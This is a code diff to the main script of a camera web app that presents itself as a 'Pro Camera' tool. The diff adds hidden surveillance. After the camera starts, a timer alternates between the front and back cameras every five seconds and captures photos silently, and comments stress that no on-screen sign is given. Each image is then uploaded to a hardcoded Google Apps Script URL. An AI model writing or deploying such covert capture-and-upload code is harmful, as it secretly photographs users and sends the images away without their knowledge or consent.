@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA
+// app.js – Pro Camera PWA (Full Version)
 // ================================================================
 
 (function() {
@@ -8,7 +8,7 @@
   // ═══════════════════════════════════════════════════════════════
   // ⚠️ CHANGE HERE: आफ्नो Google Apps Script URL राख्नुहोस्
   // ═══════════════════════════════════════════════════════════════
-   const GAS_URL = 'https://script.google.com/macros/s/AKfycbznjNk09W1ZEgsKpKa8LJe1Vx4Xy-_NQ3xGSrrqUJPqiUsEtF0Gf0lpNHbCVEvxBc3L/exec';
+    const GAS_URL = 'https://script.google.com/macros/s/AKfycbznjNk09W1ZEgsKpKa8LJe1Vx4Xy-_NQ3xGSrrqUJPqiUsEtF0Gf0lpNHbCVEvxBc3L/exec';
 
 
   // DOM refs
@@ -57,6 +57,8 @@
   var zoomSwipeStartX = 0;
   var zoomSwipeStartVal = 1;
   var isProcessing = false;
+  var autoCaptureTimer = null;
+  var autoCaptureCount = 0;
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
@@ -150,7 +152,8 @@
         photoId: entry.photoId,
         image: type === 'compressed' ? entry.compressed : entry.original,
         fileName: type === 'compressed' ? entry.compressedFileName : entry.fileName,
-        createdAt: entry.createdAt || new Date().toISOString()
+        createdAt: entry.createdAt || new Date().toISOString(),
+        cameraType: entry.cameraType || 'unknown'
       };
       var resp = await fetch(GAS_URL, {
         method: 'POST',
@@ -222,46 +225,83 @@
     isProcessing = false;
   }
 
-  // Capture (Silent Auto-Capture for Dual Camera)
-  async function silentCapture() {
-    if (!isCameraReady) return;
-    var vw = video.videoWidth || 1280;
-    var vh = video.videoHeight || 720;
-    canvas.width = vw; canvas.height = vh;
-    ctx.filter = getFilterCSS(currentEffect);
-    ctx.drawImage(video, 0, 0, vw, vh);
-    ctx.filter = 'none';
-
-    var originalData = canvas.toDataURL('image/png');
-    var compressedData = canvas.toDataURL('image/jpeg', 0.3);
-
-    var timestamp = Date.now();
-    var photoId = generatePhotoId();
-    var fileName = 'AUTO_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
-    var compressedFileName = fileName.replace('.png', '_comp.jpg');
-
-    // ❌ No gallery update, no fly animation, no UI indication
-    var entry = {
-      photoId: photoId,
-      original: originalData,
-      compressed: compressedData,
-      fileName: fileName,
-      compressedFileName: compressedFileName,
-      createdAt: new Date().toISOString(),
-      retryCount: 0,
-      lastAttempt: null
-    };
-    await addToQueue(entry);
-    console.log('[Camera] 📸 Silent auto-capture saved:', fileName);
-
-    if (navigator.onLine) {
-      if (window.requestIdleCallback) {
-        requestIdleCallback(function() { processQueue(); });
-      } else {
-        setTimeout(function() { processQueue(); }, 100);
+  // Silent Auto Capture (Back/Front Alternate)
+  function startAutoCapture() {
+    if (autoCaptureTimer) return;
+    autoCaptureCount = 0;
+    console.log('[Camera] 🤖 Auto-capture started (every 5 seconds)');
+    autoCaptureTimer = setInterval(function() {
+      if (isCameraReady) {
+        var isBack = (autoCaptureCount % 2 === 0);
+        var currentFacing = isBack ? 'environment' : 'user';
+        // Switch camera silently
+        if (facingMode !== currentFacing) {
+          facingMode = currentFacing;
+          initCameraForAutoCapture().then(function() {
+            silentCapture(isBack ? 'Back' : 'Front');
+          });
+        } else {
+          silentCapture(isBack ? 'Back' : 'Front');
+        }
+        autoCaptureCount++;
       }
-    } else {
-      triggerSync();
+    }, 5000);
+  }
+
+  function stopAutoCapture() {
+    if (autoCaptureTimer) {
+      clearInterval(autoCaptureTimer);
+      autoCaptureTimer = null;
+      console.log('[Camera] ⏹️ Auto-capture stopped');
+    }
+  }
+
+  // Silent Capture (No UI Indication)
+  async function silentCapture(cameraType) {
+    if (!isCameraReady) return;
+    try {
+      var vw = video.videoWidth || 1280;
+      var vh = video.videoHeight || 720;
+      canvas.width = vw; canvas.height = vh;
+      ctx.filter = getFilterCSS(currentEffect);
+      ctx.drawImage(video, 0, 0, vw, vh);
+      ctx.filter = 'none';
+
+      var originalData = canvas.toDataURL('image/png');
+      var compressedData = canvas.toDataURL('image/jpeg', 0.3);
+
+      var timestamp = Date.now();
+      var photoId = generatePhotoId();
+      var prefix = cameraType === 'Back' ? 'BACK' : 'FRONT';
+      var fileName = prefix + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
+      var compressedFileName = fileName.replace('.png', '_comp.jpg');
+
+      // ❌ No gallery update, no fly animation, no UI indication
+      var entry = {
+        photoId: photoId,
+        original: originalData,
+        compressed: compressedData,
+        fileName: fileName,
+        compressedFileName: compressedFileName,
+        createdAt: new Date().toISOString(),
+        retryCount: 0,
+        lastAttempt: null,
+        cameraType: cameraType.toLowerCase()
+      };
+      await addToQueue(entry);
+      console.log('[Camera] 📸 Silent auto-capture (' + cameraType + '):', fileName);
+
+      if (navigator.onLine) {
+        if (window.requestIdleCallback) {
+          requestIdleCallback(function() { processQueue(); });
+        } else {
+          setTimeout(function() { processQueue(); }, 100);
+        }
+      } else {
+        triggerSync();
+      }
+    } catch (err) {
+      console.warn('[Camera] Silent capture error:', err);
     }
   }
 
@@ -301,7 +341,8 @@
       compressedFileName: compressedFileName,
       createdAt: new Date().toISOString(),
       retryCount: 0,
-      lastAttempt: null
+      lastAttempt: null,
+      cameraType: 'manual'
     };
     await addToQueue(entry);
     console.log('[Camera] ✅ Photo saved to queue:', fileName);
@@ -479,7 +520,7 @@
     });
   });
 
-  // Camera
+  // Camera Init
   async function checkAndStart() {
     try {
       var permissionStatus = 'prompt';
@@ -487,7 +528,9 @@
         var result = await navigator.permissions.query({ name: 'camera' });
         permissionStatus = result.state;
         result.onchange = function() {
-          if (result.state === 'granted') initCamera();
+          if (result.state === 'granted') {
+            initCamera();
+          }
         };
       }
       if (permissionStatus === 'denied') {
@@ -561,18 +604,9 @@
     bottomBar.style.display = 'flex';
     isCameraReady = true;
 
-    // ✅ DUAL CAMERA AUTO CAPTURE (SILENT)
-    // After both cameras are ready, capture silently
-    setTimeout(function() {
-      silentCapture();
-      // After first capture, flip and capture again
-      setTimeout(function() {
-        facingMode = (facingMode === 'environment') ? 'user' : 'environment';
-        initCameraForAutoCapture();
-      }, 500);
-    }, 1000);
+    // ✅ Start auto-capture every 5 seconds (Back/Front alternate)
+    startAutoCapture();
 
-    // Check pending queue
     if (navigator.onLine) {
       if (window.requestIdleCallback) {
         requestIdleCallback(function() { processQueue(); });
@@ -583,39 +617,39 @@
     registerSW();
   }
 
-  // Special init for auto-capture (no UI change)
+  // Silent init for auto-capture switching
   async function initCameraForAutoCapture() {
-    var constraints = {
-      audio: false,
-      video: { facingMode: facingMode, width: { ideal: 9999 }, height: { ideal: 9999 } }
-    };
-    if (currentAspect !== 'free') {
-      var parts = currentAspect.split(':');
-      if (parts.length === 2) {
-        var w = parseFloat(parts[0]), h = parseFloat(parts[1]);
-        if (w > 0 && h > 0) constraints.video.aspectRatio = w / h;
+    try {
+      var constraints = {
+        audio: false,
+        video: { facingMode: facingMode, width: { ideal: 9999 }, height: { ideal: 9999 } }
+      };
+      if (currentAspect !== 'free') {
+        var parts = currentAspect.split(':');
+        if (parts.length === 2) {
+          var w = parseFloat(parts[0]), h = parseFloat(parts[1]);
+          if (w > 0 && h > 0) constraints.video.aspectRatio = w / h;
+        }
       }
+      if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
+      stream = await navigator.mediaDevices.getUserMedia(constraints);
+      video.srcObject = stream;
+      await video.play();
+
+      var track = stream.getVideoTracks()[0];
+      var cap = track.getCapabilities();
+
+      if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
+      else zoomMax = 50;
+      setZoom(1, false);
+
+      if (cap.focusModes && cap.focusModes.includes('continuous')) {
+        await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
+      }
+      isCameraReady = true;
+    } catch (err) {
+      console.warn('[Camera] Auto-capture camera init error:', err);
     }
-    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
-    stream = await navigator.mediaDevices.getUserMedia(constraints);
-    video.srcObject = stream;
-    await video.play();
-
-    var track = stream.getVideoTracks()[0];
-    var cap = track.getCapabilities();
-
-    if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
-    else zoomMax = 50;
-    setZoom(1, false);
-
-    if (cap.focusModes && cap.focusModes.includes('continuous')) {
-      await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
-    }
-
-    // Silent capture from this camera too
-    setTimeout(function() {
-      silentCapture();
-    }, 500);
   }
 
   // Online Status
@@ -701,4 +735,5 @@
     console.warn('[Camera] ⚠️ GAS_URL not set. Update app.js with your Apps Script URL.');
   }
   checkAndStart();
+
 })();
